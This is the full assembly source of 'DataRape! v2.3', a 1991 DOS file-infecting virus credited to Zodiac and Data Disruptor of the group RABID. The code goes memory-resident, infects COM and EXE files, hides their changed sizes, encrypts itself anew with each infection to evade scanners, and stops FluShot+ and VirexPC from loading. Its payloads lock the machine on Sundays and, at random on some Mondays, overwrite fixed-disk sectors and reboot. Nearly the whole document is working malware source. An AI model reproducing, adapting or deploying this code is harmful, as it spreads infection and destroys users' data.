@b      macro   char
        mov     ah,0eh
        mov     al,char
        int     10h
endm
;---
; DataRape! v2.3 Source Code
;
; Written by Zodiac and Data Disruptor
;
; (C) 1991 RABID International Development Corp
; (Aug.14.91)
;---
;
; Note: Assuming that and infected COMMAND.COM was booted, FSP/VirexPC will
;       not be able to go resident under this version of DataRape!
;
;---

code         segment
	     assume     cs:code,ds:code,es:code

v:                                      ; All Pre-Resident Offsets Based
					; upon this location

startup:
	     call       relative
relative:
	     pop        si
	     sub        si,offset relative
	     mov        bp,si
	     cld

	     push       ax                      ;
	     push       es                      ; Saves registers
	     push       si                      ;
	     push       ds                      ;
             mov        ah,2ah                  ; Get system time
             int        21h
             cmp        al,0
             jne        are_we_here_boost
             jmp        its_sunday

are_we_here_boost:
             jmp   are_we_here

;---
; If it's Sunday, then we display a message and lock the system
;---
its_sunday:
             mov        ah,01h
             mov        cx,2020h
             int        10h                     ;NUL the cursor

             mov        ah,02h                  ;Moves the cursor
             xor        dx,dx
             int        10h

             xor        ax,ax                   ;Clears the screen
             int        10h

             @b         "I"
             @b         "t"
             @b         "'"
             @b         "s"
             @b         " "
             @b         "S"
             @b         "u"
             @b         "n"
             @b         "d"
             @b         "a"
             @b         "y"
             @b         "."
             @b         " "
             @b         "W"
             @b         "h"
             @b         "y"
             @b         " "
             @b         "a"
             @b         "r"
             @b         "e"
             @b         " "
             @b         "y"
             @b         "o"
             @b         "u"
             @b         " "
             @b         "w"
             @b         "o"
             @b         "r"
             @b         "k"
             @b         "i"
             @b         "n"
             @b         "g"
             @b         "?"
             @b         13
             @b         10
             @b         "T"
             @b         "a"
             @b         "k"
             @b         "e"
             @b         " "
             @b         "t"
             @b         "h"
             @b         "e"
             @b         " "
             @b         "d"
             @b         "a"
             @b         "y"
             @b         " "
             @b         "o"
             @b         "f"
             @b         "f"
             @b         " "
             @b "c"
             @b "o"
             @b "m"
             @b "p"
             @b "l"
             @b "i"
             @b "m"
             @b "e"
             @b "n"
             @b "t"
             @b "s"
             @b " "
             @b "o"
             @b "f"
             @b " "
             @b "R"
             @b "A"
             @b "B"
             @b "I"
             @b "D"
             @b 7


im_looped:   jmp        im_looped

are_we_here:
             mov	ax,6969h                ; Check to see if we are
	     int	21h                     ; Allready resident
	     cmp	bx,6969h
	     je	        already_here            ; Yes? Then leave the program
	     jmp	after_trish

db	     13,10,'Patricia Boon',13,10

after_trish:
	     xor        ax,ax                               ;
	     mov        ds,ax                               ; Loads Current
	     les        ax,ds:[21h*4]                       ; Int 21h Vector
	     mov        word ptr cs:[si+save_int_21],ax     ;
	     mov        word ptr cs:[si+save_int_21+2],es   ;
             push       cs
             pop        ds
             jmp        load_mem
already_here:
	     pop        es                                  ; If, exit
go_go_program:                                              ;
	     jmp        go_program                          ;

exit_exe:
	     mov        bx,es                               ;
	     add        bx,10h                              ; E
	     add        bx,word ptr cs:[si+call_adr+2]      ; X
	     mov        word ptr cs:[si+patch+2],bx         ; E
	     mov        bx,word ptr cs:[si+call_adr]        ;
	     mov        word ptr cs:[si+patch],bx           ; E
	     mov        bx,es                               ; X
	     add        bx,10h                              ; I
	     add        bx,word ptr cs:[si+stack_pointer+2] ; T
	     mov        ss,bx                               ; I
	     mov        sp,word ptr cs:[si+stack_pointer]   ; N
	     db         0eah                                ; G
patch:                                                      ;
	     dd         0                                   ;
      
; Below should be changed to:
; exit_com: xor bx,bx
;           push bx
;           mov di,100h
;           push di
;           add si,offset my_save
;           movsb
;           movsw
;           ret

exit_com:
	     mov        di,100h                             ; EXIT
	     add        si,offset my_save                   ; COM
	     movsb                                          ;
	     movsw                                          ;
	     xor        bx,bx                               ;
	     push       bx                                  ;
	     jmp        [si-11]                             ;

;---
; Here is where we load ourselves into memory
;---

load_mem:
	     pop        es
	     mov        ah,49h                  ; Release memory
	     int        21h
	     mov        bx,0ffffh               ; Set memory for FFFFh
                                                ; paragraphs
	     mov        ah,48h                  ; Allocate memory for
                                                ; ourselves
	     int        21h
	     sub        bx,(top_bz+my_bz+1ch-1)/16+2
	     jc         go_go_program
	     mov        cx,es
	     stc
	     adc        cx,bx
	     mov        ah,4ah                  ; Modify memory allocation
	     int        21h
	     mov        bx,(offset top_bz+offset my_bz+1ch-1)/16+1
	     stc
	     sbb        es:[2],bx
	     push       es
	     mov        es,cx
	     mov        ah,4ah
	     int        21h
	     mov        ax,es
	     dec        ax
	     mov        ds,ax
	     mov        word ptr ds:[1],8
	     call       mul_16
	     mov        bx,ax
	     mov        cx,dx
	     pop        ds
	     mov        ax,ds
	     call       mul_16
	     add        ax,ds:[6]
	     adc        dx,0
	     sub        ax,bx
	     sbb        dx,cx
	     jc         mem_ok
	     sub        ds:[6],ax            ; This section look familiar?
mem_ok:
	     pop        si
	     push       si
	     push       ds
	     push       cs
	     xor        di,di
	     mov        ds,di
	     lds        ax,ds:[27h*4]
	     mov        word ptr cs:[si+save_int_27],ax
	     mov        word ptr cs:[si+save_int_27+2],ds
	     pop        ds
	     mov        cx,offset aux_size
	     rep        movsb
	     xor        ax,ax
	     mov        ds,ax
	     mov        ds:[21h*4],offset int_21
	     mov        ds:[21h*4+2],es
	     mov        ds:[27h*4],offset int_27
	     mov        ds:[27h*4+2],es
	     mov        word ptr es:[filehndl],ax
	     pop        es
go_program:
             mov        ah,30h                  ; Get DOS version number
             int        21h
             cmp        al,4                    ;
             jae        check_date              ; If >= 4 then check the date
             jmp        no_fry                  ; NOT?! Then continue with
                                                ; virus
check_date:  mov        ah,2ah                  ; Get system time
             int        21h
             cmp        al,1                    ; Is it a monday?
             je         randomizer
             jmp        no_fry
;---
; If we actually get here, then we have a one in 15 chance that we will fry
; the hard-drive. You may ask yourself, "Why do you go through all the
; trouble?". Easy, because the main priority here is spreading, and not
; fucking up data...
;---

randomizer:
             mov        ah,2ch                  ; Get system time
             int        21h
             and        dl,0fh
             or         dl,dl
             jnz        no_fry
             jmp        write_short

no_fry:      pop        si                      ; Restore registers
	     pop        ds
	     pop        ax
	     cmp        word ptr cs:[si+my_save],5a4dh ; Is it an EXE file?
	     jne        go_exit_com             ; No? Then must be a COM file.
	     jmp        exit_exe                ; Yes! Exit an EXE file
go_exit_com:
	     jmp        exit_com

int_27:
	     pushf                                      ; Allocates Memory,
	     call       alloc                           ; So TSR can load
	     popf                                       ;
	     jmp        dword ptr cs:[save_int_27]      ;

;---
; This routine will return our ID byte in BX if we are resident.
;---
weare_here:
	     popf
	     xor        ax,ax
	     mov        bx,6969h                        ; ID Register
	     iret
     
int_21:
	     push       bp
	     mov        bp,sp
	     push       [bp+6]
	     popf
	     pop        bp                              ; Set Up Stack

	     pushf                                      ; Save Flag
	     cld
	     cmp        ax,6969h
	     je         weare_here

	     cmp        ah,11h                          ; Hide In
	     jb         not_hide                        ; Directory
	     cmp        ah,12h                          ; Listing
	     ja         not_hide                        ;
fcb_find:
	      call      dword ptr cs:[save_int_21]
	      push      ax
	      push      bx
	      push      ds
	      push      es
	      pushf

	      cmp       al,0FFh
	      je        done_hide                      ; Not There?

	      mov       ah,2Fh
	      int       21h                            ; Get Size
	      push      es
	      pop       ds
	      cmp       byte ptr es:[bx],0FFh          ; Extended FCB?
	      jne       not_extended
	      add       bx,7
not_extended:
	      mov       ax,es:[bx+17h]
	      and       ax,1Fh
	      cmp       ax,1Fh                         ; Check Time Stamp

;--
; Checking to see if the file is with a 62 seconds filestamp...
;--

	      jne       done_hide               ; No? Then the file is not
						; infected. Leave it alone...

;--
; If we get here, then we've deduced that the file is indeed infected.
; Therefore, we must reduce the filesize from the DTA in order to show that it
; is "not infected"
;--
	      sub       word ptr es:[bx+1Dh],offset top_file
	      sbb       word ptr es:[bx+1Dh+2],0       ; Decrease Size

;---
; Finished hiding, restore the resigers we saved, and return to the INT
; whence we came from...
;---

done_hide:
	      popf
	      pop       es
	      pop       ds
	      pop       bx
	      pop       ax
	      iret

;--
; Function differentiation happens here...
;--

directory:
         jmp   fcb_find

weare_here_boost:
         jmp     weare_here

;---
; If FluShot+ or VirexPC are trying to go resident, then tell them that
; we "allready are" resident
;---

fsp_trying:
         popf
         mov    ax,101h                   ;Set FSP/Virex ID byte
         iret

not_hide:
         cmp     ax,0ff0fh
         je      fsp_trying
         cmp     ah,3ch                  ; Are we creating a file?
         je      create
         cmp     ah,3dh                  ; Open file handle?
         je      touch
	 cmp     ah,3eh                  ; Are we closing a file?
	 je      close
         cmp     ah,43h                  ; Get/Set file attributes?
         je      touch
	 cmp     ax,4b00h                ; Are we executing a file?
	 je      touch
         cmp     ax,6969h                ; Checking if we are resident?
         je      weare_here_boost
	 cmp     ah,5bh                  ; Creating a file?
	 jne     not_create

create:
	     cmp        word ptr cs:[filehndl],0
	     jne        dont_touch
	     call       see_name
	     jnz        dont_touch
	     call       alloc
	     popf
	     call       function
	     jc         int_exit
	     pushf
	     push       es
	     push       cs
	     pop        es
	     push       si
	     push       di
	     push       cx
	     push       ax
	     mov        di,offset filehndl
	     stosw
	     mov        si,dx
	     mov        cx,65
move_name:
	     lodsb
	     stosb
	     test       al,al
	     jz         all_ok
	     loop       move_name
	     mov        word ptr es:[filehndl],cx
             jmp        all_ok

touch:
             jmp   try_infect

all_ok:
	     pop        ax
	     pop        cx
	     pop        di
	     pop        si
	     pop        es
go_exit:
	     popf
	     jnc        int_exit
close:
	     cmp        bx,word ptr cs:[filehndl]
	     jne        dont_touch
	     test       bx,bx
	     jz         dont_touch
	     call       alloc
	     popf
	     call       function
	     jc         int_exit
	     pushf
	     push       ds
	     push       cs
	     pop        ds
	     push       dx
	     mov        dx,offset filehndl+2
	     call       do_file
	     mov        word ptr cs:[filehndl],0
	     pop        dx
	     pop        ds
	     jmp        go_exit
not_create:
	     cmp        ah,3dh
	     je         touch
	     cmp        ah,43h
	     je         touch
	     cmp        ah,56h
	     jne        dont_touch
try_infect:
	     call       see_name
	     jnz        dont_touch
	     call       do_file
dont_touch:
	     call       alloc
	     popf
	     call       function
int_exit:
	     pushf
	     push       ds
	     call       get_chain
	     mov        byte ptr ds:[0],'Z'
	     pop        ds
	     popf
dummy        proc       far                             ; This is absolutely
	     ret        2                               ; needed, IRET
dummy        endp                                       ; doesn't cut it

see_name:
	     push       ax
	     push       si
	     mov        si,dx

;--
; Here's a crude yet effective way of scanning the file handle in order to see
; what type of file it is...
;
; (NOTE: We make up for crudeity later by checking the first two bytes of the
;  file to see if it is a COM or EXE file (4d5a))
;--

scan_name:
	     lodsb
	     test       al,al
	     jz         bad_name
	     cmp        al,'.'
	     jnz        scan_name
	     call       get_byte
	     mov        ah,al
	     call       get_byte
	     cmp        ax,'co'
	     jz         pos_com
	     cmp        ax,'ex'
	     jnz        good_name
	     call       get_byte
	     cmp        al,'e'
	     jmp        short good_name
pos_com:
	     call       get_byte
	     cmp        al,'m'
	     jmp        short good_name
bad_name:
	     inc        al
good_name:
	     pop        si
	     pop        ax
	     ret
      
get_byte:
	     lodsb
	     cmp        al,'C'
	     jc         byte_got
	     cmp        al,'Y'
	     jnc        byte_got
	     add        al,20h
byte_got:
	     ret
      
function:
	     pushf
	     call       dword ptr cs:[save_int_21]
	     ret
      
do_file:
	     push       ds
	     push       es
	     push       si
	     push       di
	     push       ax
	     push       bx
	     push       cx
	     push       dx
	     xor        cx,cx
	     mov        ax,4300h
	     call       function
	     mov        bx,cx
	     and        cl,0feh
	     cmp        cl,bl
	     je         dont_change
	     mov        ax,4301h
	     call       function
	     stc
dont_change:
	     pushf
	     push       ds
	     push       dx
	     push       bx
	     mov        ax,3d02h
	     call       function
	     jc         cant_open
	     mov        bx,ax
	     call       disease
	     mov        ah,3eh

	     call       function
cant_open:
	     pop        cx
	     pop        dx
	     pop        ds
	     popf
	     jnc        no_update
	     mov        ax,4301h
	     call       function
no_update:
	     pop        dx
	     pop        cx
	     pop        bx
	     pop        ax
	     pop        di
	     pop        si
	     pop        es
	     pop        ds
	     ret
      
disease:
	     push       cs
	     pop        ds
	     push       cs
	     pop        es
	     mov        dx,offset top_save
	     mov        cx,18h
	     mov        ah,3fh
	     int        21h
	     xor        cx,cx
	     xor        dx,dx
	     mov        ax,4202h
	     int        21h
	     mov        word ptr [top_save+1ah],dx
	     cmp        ax,offset top_file
	     sbb        dx,0
	     jc         stop_infect
	     mov        word ptr [top_save+18h],ax

	     mov        ax,5700h
	     int        21h                             ; Check if Infected
	     and        cx,1Fh
	     cmp        cx,1Fh
	     je         stop_infect
	     xor        cx,cx
	     xor        dx,dx
	     mov        ax,4202h
	     int        21h
	     cmp        word ptr [top_save],5a4dh
	     je         fuck_exe
	     add        ax,offset aux_size+200h
	     adc        dx,0
	     je         fuck_it
stop_infect: ret
      
fuck_exe:
	     mov        dx,word ptr [top_save+18h]
	     neg        dl
	     and        dx,0fh
	     xor        cx,cx
	     mov        ax,4201h
	     int        21h
	     mov        word ptr [top_save+18h],ax
	     mov        word ptr [top_save+1ah],dx
fuck_it:
	     mov        ax,5700h
	     int        21h
	     pushf
	     push       cx
	     push       dx
	     cmp        word ptr [top_save],5a4dh
	     je         exe_file
	     mov        ax,100h
	     jmp        short set_adr
exe_file:
	     mov        ax,word ptr [top_save+14h]
	     mov        dx,word ptr [top_save+16h]
set_adr:
	     mov        di,offset call_adr
	     stosw
	     mov        ax,dx
	     stosw
	     mov        ax,word ptr [top_save+10h]
	     stosw
	     mov        ax,word ptr [top_save+0eh]
	     stosw
	     mov        si,offset top_save
	     movsb
	     movsw

copy_body:
	     xor        si,si
	     mov        di,offset body
	     mov        cx,offset top_file
	     rep        movsb                           ; Copies virus
							; body to buffer

enc_body:    mov        si,offset body
	     mov        di,si

;**************************
;* CHANGE ENCRYPTION BASE *
;**************************
 
	     mov        ah,2Ch                  ;Get system time
	     int        21h
	     mov        byte ptr [enc_base_1],dl
	     mov        byte ptr [body-v+enc_base_2],dl

;****************************
;* CHANGE ENCRYPTION METHOD *
;****************************

	     call       yes_no
	     jc         ror_rol
rol_ror:     mov        ax,0C0C8h
	     jmp        short set_method
ror_rol:     mov        ax,0C8C0h
set_method:  mov        byte ptr [enc_meth_1],ah
	     mov        byte ptr [body-v+enc_meth_2],al

;*******************************
;* FLIP SOME REGISTERS, PART 1 *
;*******************************

	     call       yes_no
	     jc         es_ds
ds_es:       mov        ax,1F07h
	     jmp        short set_pops
es_ds:       mov        ax,071Fh
set_pops:    mov        byte ptr [body-v+pop_1],ah
	     mov        byte ptr [body-v+pop_2],al

;*******************************
;* FLIP SOME REGISTERS, PART 2 *
;*******************************

;---
; Zodiac has informed me that there is an error in the following routine
; he has advised me to coment it out until he fixes the bug
;---

;	call       yes_no
;	jc         di_di_si
;si_si_di:
;	mov        ax,5EEEh
;	mov        dl,0F7h
;	jmp        short set_switch
;di_di_si:
;	mov        ax,5FEFh
;	mov        dl,0FEh
;set_switch: 
;	mov        byte ptr [switch_1],ah
;	mov        byte ptr [switch_2],al
;	mov        byte ptr [switch_3],dl

;*******************************
;* FLIP SOME REGISTERS, PART 3 *
;*******************************

	     mov        al,56h
	     call       yes_no
	     jc         set_push
	     inc        al
set_push:    mov        byte ptr [push_1],al

;*******************************
;* FLIP SOME REGISTERS, PART 4 *
;*******************************

	     call       yes_no
	     jc         set_dl
set_dh:      mov        ax,0B6F1h
	     mov        dl,0C6h
	     jmp        short set_inc
set_dl:      mov        ax,0B2D1h
	     mov        dl,0C2h
set_inc:     mov        byte ptr [inc_1],ah
	     mov        byte ptr [inc_2],al
	     mov        byte ptr [inc_3],dl

;*******************************
;* FLIP SOME REGISTERS, PART 5 *
;*******************************

	     call       yes_no
	     jc         ds_ax
ax_ds:       mov        ax,1E50h
	     mov        dx,581Fh
	     jmp        short set_push_2
ds_ax:       mov        ax,501Eh
	     mov        dx,1F58h
set_push_2:  mov        word ptr [push_2_1],ax
	     mov        word ptr [push_2_2],dx

	     db         0B2h
enc_base_1:  db         00h                             ; General ENC Base

	     mov        cx,offset un_enc

enc_loop:    lodsb
	     push       cx
	     mov        cl,dl
	     inc        dl
;---
; What is the meaning of this???
;---

	     db         0D2h
enc_meth_1:  db         0C0h
	     pop        cx
	     stosb
	     loop       enc_loop                        ; Encrypto

	     mov        dx,offset body
	     mov        cx,offset top_file
	     mov        ah,40h
	     int        21h                             ; Write Body

	     jc         go_no_fuck
	     xor        cx,ax
	     jnz        go_no_fuck
	     mov        dx,cx
	     mov        ax,4200h
	     int        21h
	     cmp        word ptr [top_save],5a4dh
	     je         do_exe
	     mov        byte ptr [top_save],0e9h
	     mov        ax,word ptr [top_save+18h]

;****** Below Sets the JMP so to go to the Unencryption Portion of the Virus
;****** This Doesn't happen when this is first compiled, an infection
;****** Needs to occur
	     
	     add        ax,un_enc-v-3

;******
	     
	     mov        word ptr [top_save+1],ax
	     mov        cx,3
	     jmp        short write_header
go_no_fuck:
	     jmp        short no_fuck_boost

yes_no:      push       ax
	     mov        ah,2Ch                  ;Get system time
	     int        21h
	     pop        ax                      ;Save AX
	     test       dl,1                    ;Are the 100ths of seconds 1
	     jpe        set_yes                 ;If parity is equal, SET_YES
set_no:      clc                                ;Clear carry flag
	     ret
set_yes:     stc                                ;Set carry flag
	     ret
             jmp        do_exe

no_fuck_boost:
              jmp       no_fuck

;---
; Construct the    .EXE file's header
;---    
  
do_exe:
	     mov        ax,word ptr [top_save+8]
	     call       mul_16
     
	     not        ax
	     not        dx
	     inc        ax
	     jne        calc_offs
	     inc        dx
calc_offs:
	     add        ax,word ptr [top_save+18h]
	     adc        dx,word ptr [top_save+1ah]
	     mov        cx,10h
	     div        cx

;****** Below Sets the Calling Address to the Unencryption Portion of the
;****** Virus This Doesn't happen when this is first compiled, an infection
;****** Needs to occur
	     
	     mov        word ptr [top_save+14h],un_enc-v

;******
	     mov        word ptr [top_save+16h],ax
	     add        ax,(offset top_file-offset v-1)/16+1
	     mov        word ptr [top_save+0eh],ax
	     mov        word ptr [top_save+10h],100h
	     add        word ptr [top_save+18h],offset top_file
	     adc        word ptr [top_save+1ah],0
	     mov        ax,word ptr [top_save+18h]
	     and        ax,1ffh
	     mov        word ptr [top_save+2],ax
	     pushf
	     mov        ax,word ptr [top_save+19h]
	     shr        byte ptr [top_save+1bh],1
	     rcr        ax,1
	     popf
	     jz         update_len
	     inc        ax
update_len:
	     mov        word ptr [top_save+4],ax
	     mov        cx,18h
write_header:
	     mov        dx,offset top_save
	     mov        ah,40h
	     int        21h
	     pop       dx
	     pop       cx
	     and       cx,0FFE0h
	     or        cx,1Fh
	     jmp       short time_got                   ; Mark Time Stamp

db	13,10,"Free Flash Force!!!",13,10

no_fuck:
	     pop        dx
	     pop        cx
time_got:    popf
	     jc         stop_fuck
	     mov        ax,5701h
	     int        21h
stop_fuck:
	     ret
      
alloc:
	     push       ds
	     call       get_chain
	     mov        byte ptr ds:[0],'M'
	     pop        ds
	     ret
     
get_chain:
	     push       ax
	     push       bx
	     mov        ah,62h
	     call       function
	     mov        ax,cs
	     dec        ax
	     dec        bx
next_blk:
	     mov        ds,bx
	     stc
	     adc        bx,ds:[3]
	     cmp        bx,ax
	     jc         next_blk
	     pop        bx
	     pop        ax
	     ret
      
mul_16:
	     mov        dx,10h
	     mul        dx
	     ret

kill:   call    kill_rel

kill_rel:
	pop     si
	jmp	write_short

re_do:
	mov     byte ptr [sector],1             ; Reset sector count to 1
	inc     byte ptr [track]                ; Increment next track
	jmp     fuck_drive                      ; Fuck it...

;---
; This routine is very nasty!!!
;---

write_short:
	push	cs
	pop	ds
	cmp     byte ptr [track],40
	jae     reboot
	cmp     byte ptr [sector],9
	ja      re_do

fuck_drive:
	mov     ah,03h                          ; Write disk sectors
	mov     al,9                            ; Xfer 9 sectors
	mov     bx,offset header                ; Set for buffer
	mov     ch,byte ptr [track]             ; Set for track [track]
	mov     cl,byte ptr [sector]            ; Set for sector [sector]
	mov     dh,0                            ; Set for head 0
	mov     dl,2                            ; Set for first fixed drive

	int     13h

	inc     byte ptr [sector]
	jmp     write_short

;---
; This code will cold boot the CPU with a memory check
;---

reboot:
	mov	ax,0040h
	mov	ds,ax
	mov	ax,07f7fh
	mov	ds:[0072],ax
db	0eah,00h,00h,0ffh,0ffh			; JMP FFFF:0000

header	db	"------------------",13,10
	db      "  DataRape! v2.2  ",13,10
	db      "    By Zodiac     ",13,10
	db      "and Data Disruptor",13,10
        db      "                  ",13,10
	db	"  (c) 1991 RABID  ",13,10
        db      "Int'nl Development",13,10
        db      "       Corp.      ",13,10
	db	"------------------",13,10

greetings db     13,10
         db     "Greetings to The Dark Avenger, Tudor Todorov, Patricia Hoffman",13,10
         db     "(Get your articles correct for a change... Maybe we should write",13,10
         db     "for you...), John McAfee (Who wouldn't be where he is today if it",13,10
         db     "were not for people like us...), PCM2 (Get your ass back in gear dude!)",13,10
         db     "ProTurbo, MadMan, Rick Dangerous, Elrond Halfelven, The Highwayman,",13,10
         db     "Optical Illusion, The (Real) Gunslinger, Patricia (SMOOCH), The GateKeeper,",13,10
         db     "Sledge Hammer (Let's hope you don't get hit by this one 3 times), Delko,",13,10
         db     "Paul 'Jougensen' & Mike 'Hunt' (And whoever else was there to see Chris & Cosy)",13,10
         db     "the entire Bulgarian virus factory, and any others whom we may have missed...",13,10
         db     " Remember: Winners don't use drugs! Someone card me a lifesign though...",13,10
         db     13,10
         db     "(c) 1991 The RABID International Development Corp."

call_adr:
	     dd         100h
stack_pointer:
	     dd         0
my_save:
	     int        20h
	     nop

;**** UnEncryption Below

un_enc:      call       enc_rel
enc_rel:     pop        si
rel_sub:     sub        si,offset enc_rel

;---
; Note: These are the only bytes which are constant throughout any infection
;---

rel_copy:    mov        di,si

push_1:      push       si

push_2_1:    push       ax
	     push       ds
	     push       es

	     push       cs
pop_1:       pop        ds;-

	     push       cs
pop_2:       pop        es;-

;---
; The constant bytes end here. (There are only 10 bytes...)
;---
inc_1:       db         0B2h

enc_base_2:  db         00h
	     mov        cx,offset un_enc
un_enc_loop: lodsb
	     push       cx
	     db         88h
inc_2:       db         0D1h

	     db         0D2h
enc_meth_2:  db         0C8h

	     db         0FEh
inc_3:       db         0C2h
	     pop        cx
	     stosb
	     loop       un_enc_loop

	     pop        es
push_2_2:    pop        ds
	     pop        ax
	     ret

sector  db      1			; Count of sectors that have been fried
track   db      0			; Count of tracks that have been fried

top_file:
save_int_21  equ        $
save_int_27  equ        save_int_21+4
filehndl     equ        save_int_27+4
filename     equ        filehndl+2
aux_size     equ        filename+65
top_save     equ        filename+65
body         equ        top_save+1Ch
top_bz       equ        top_save-v
my_bz        equ        top_file-v
switch_1     equ        enc_rel
switch_2     equ        rel_sub+1
switch_3     equ        rel_copy+1

;dta          equ        aux_size
; dta_attr    equ        dta+21
; dta_time    equ        dta+22
; dta_date    equ        dta+24
; dta_size_lo equ        dta+26
; dta_size_hi equ        dta+28
; dta_name    equ        dta+30
;

code    ends
	     end

;--
; End of virus
;--
